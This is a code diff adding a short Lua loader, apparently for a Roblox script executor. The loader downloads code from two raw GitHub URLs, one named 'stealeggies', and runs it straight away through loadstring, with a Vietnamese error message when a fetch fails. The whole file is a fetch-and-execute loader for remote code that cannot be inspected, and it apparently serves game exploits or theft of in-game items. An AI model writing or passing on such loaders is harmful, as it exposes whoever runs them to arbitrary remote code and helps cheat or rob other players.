@@ -1,0 +1,18 @@
+local links = {
+    "https://raw.githubusercontent.com/diephang2023-arch/MENU-GAU-MODS/refs/heads/main/bot.txt",
+    "https://raw.githubusercontent.com/miirandahub/loader/refs/heads/main/stealeggies"
+}
+
+for _, url in ipairs(links) do
+    local success, err = pcall(function()
+        local source = game:HttpGet(url)
+        local fn = loadstring(source)
+        if fn then
+            fn()
+        end
+    end)
+
+    if not success then
+        warn("Lỗi khi chạy script từ link: " .. tostring(url) .. " | Chi tiết: " .. tostring(err))
+    end
+end
